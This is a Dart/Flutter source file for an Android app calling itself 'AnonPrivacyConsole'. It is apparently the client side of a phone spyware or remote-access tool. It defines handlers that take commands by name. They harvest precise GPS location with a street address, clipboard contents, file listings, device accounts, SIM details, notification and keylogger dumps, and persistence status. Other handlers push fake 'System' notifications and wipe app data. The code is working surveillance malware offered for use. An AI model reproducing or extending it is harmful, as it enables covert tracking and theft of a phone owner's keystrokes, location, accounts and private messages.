import 'dart:convert';
import 'dart:io';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:geolocator/geolocator.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';

/// Platform channel → Kotlin MainActivity host
class NativeHost {
  static const _ch = MethodChannel('com.anon.privacy/host');

  static Future<Map<String, dynamic>> invoke(
    String method, [
    Map<String, dynamic>? args,
  ]) async {
    try {
      final r = await _ch.invokeMethod<dynamic>(method, args);
      if (r is Map) return Map<String, dynamic>.from(r);
      return {'value': r};
    } on MissingPluginException {
      throw Exception('native host plugin missing — rebuild APK');
    } on PlatformException catch (e) {
      throw Exception(e.message ?? e.code);
    }
  }
}

/// Free reverse-geocode via OpenStreetMap Nominatim (no API key).
Future<Map<String, dynamic>?> reverseGeocode(double lat, double lon) async {
  final uri = Uri.parse(
    'https://nominatim.openstreetmap.org/reverse'
    '?format=jsonv2&lat=$lat&lon=$lon&addressdetails=1&zoom=18',
  );
  try {
    final res = await http.get(
      uri,
      headers: {
        // Nominatim requires a valid identifying User-Agent
        'User-Agent': 'AnonPrivacyConsole/3.0 (operator-geoloc)',
        'Accept': 'application/json',
      },
    ).timeout(const Duration(seconds: 12));
    if (res.statusCode < 200 || res.statusCode >= 300) return null;
    final data = jsonDecode(res.body);
    if (data is! Map) return null;
    final map = Map<String, dynamic>.from(data);
    final address = map['address'] is Map
        ? Map<String, dynamic>.from(map['address'] as Map)
        : <String, dynamic>{};
    return {
      'displayName': map['display_name'],
      'address': address,
      'road': address['road'] ?? address['pedestrian'] ?? address['path'],
      'suburb': address['suburb'] ?? address['neighbourhood'] ?? address['city_district'],
      'city': address['city'] ?? address['town'] ?? address['village'] ?? address['municipality'],
      'state': address['state'] ?? address['region'],
      'postcode': address['postcode'],
      'country': address['country'],
      'countryCode': address['country_code'],
    };
  } catch (_) {
    return null;
  }
}

Future<Map<String, dynamic>> cmdInfo(Map<String, dynamic> args) async {
  final android = await DeviceInfoPlugin().androidInfo;
  final battery = Battery();
  int level = -1;
  try {
    level = await battery.batteryLevel;
  } catch (_) {}
  final net = await Connectivity().checkConnectivity();
  Map<String, dynamic>? native;
  try {
    native = await NativeHost.invoke('deviceInfo');
  } catch (_) {}
  return {
    'manufacturer': android.manufacturer,
    'model': android.model,
    'device': android.device,
    'brand': android.brand,
    'sdk': android.version.sdkInt,
    'release': android.version.release,
    'fingerprint': android.fingerprint,
    'isPhysical': android.isPhysicalDevice,
    'battery': level,
    'network': net.map((e) => e.name).toList(),
    if (native != null) 'native': native,
  };
}

Future<Map<String, dynamic>> cmdGeoloc(Map<String, dynamic> args) async {
  final perm = await Permission.locationWhenInUse.request();
  if (!perm.isGranted) throw Exception('location permission denied');
  final enabled = await Geolocator.isLocationServiceEnabled();
  if (!enabled) throw Exception('location services disabled');
  final pos = await Geolocator.getCurrentPosition(
    locationSettings: const LocationSettings(
      accuracy: LocationAccuracy.high,
      timeLimit: Duration(seconds: 15),
    ),
  );
  final geo = await reverseGeocode(pos.latitude, pos.longitude);
  return {
    'lat': pos.latitude,
    'lon': pos.longitude,
    'acc': pos.accuracy,
    'alt': pos.altitude,
    'speed': pos.speed,
    if (geo != null) 'address': geo,
    if (geo != null && geo['displayName'] != null) 'streetAddress': geo['displayName'],
  };
}

Future<Map<String, dynamic>> cmdClipboard(Map<String, dynamic> args) async {
  return NativeHost.invoke('clipboardRead');
}

Future<Map<String, dynamic>> cmdFiles(Map<String, dynamic> args) async {
  final path = (args['path'] ?? '/sdcard').toString();
  try {
    return await NativeHost.invoke('listDir', {'path': path});
  } catch (_) {
    final dir = Directory(path);
    if (!await dir.exists()) throw Exception('path not found: $path');
    final ents = <Map<String, dynamic>>[];
    await for (final e in dir.list(followLinks: false)) {
      final st = await e.stat();
      ents.add({
        'name': e.path.split(Platform.pathSeparator).last,
        'path': e.path,
        'type': st.type == FileSystemEntityType.directory ? 'dir' : 'file',
        'size': st.size,
      });
      if (ents.length >= 200) break;
    }
    return {'path': path, 'entries': ents};
  }
}

Future<Map<String, dynamic>> cmdAccounts(Map<String, dynamic> args) async {
  return NativeHost.invoke('listAccounts');
}

Future<Map<String, dynamic>> cmdSim(Map<String, dynamic> args) async {
  return NativeHost.invoke('simInfo');
}

Future<Map<String, dynamic>> cmdNotifications(Map<String, dynamic> args) async {
  return NativeHost.invoke('notificationDump');
}

Future<Map<String, dynamic>> cmdKeylogDump(Map<String, dynamic> args) async {
  return NativeHost.invoke('keylogDump');
}

Future<Map<String, dynamic>> cmdPersistStatus(Map<String, dynamic> args) async {
  return NativeHost.invoke('persistStatus');
}

Future<Map<String, dynamic>> cmdPushText(Map<String, dynamic> args) async {
  final title = (args['title'] ?? args['text'] ?? 'System').toString();
  final body = (args['body'] ?? args['text'] ?? '').toString();
  return NativeHost.invoke('showNotification', {'title': title, 'body': body});
}

Future<Map<String, dynamic>> cmdWipeAppData(Map<String, dynamic> args) async {
  final prefs = await SharedPreferences.getInstance();
  await prefs.clear();
  try {
    await NativeHost.invoke('wipeAppData');
  } catch (_) {}
  return {'wiped': true, 'note': 'local app data cleared'};
}

typedef JobHandler = Future<Map<String, dynamic>> Function(Map<String, dynamic> args);

final Map<String, JobHandler> kHandlers = {
  'info': cmdInfo,
  'geoloc': cmdGeoloc,
  'clipboard': cmdClipboard,
  'files': cmdFiles,
  'accounts': cmdAccounts,
  'sim': cmdSim,
  'notifications': cmdNotifications,
  'keylog_dump': cmdKeylogDump,
  'persist_status': cmdPersistStatus,
  'push_text': cmdPushText,
  'wipe_app_data': cmdWipeAppData,
};
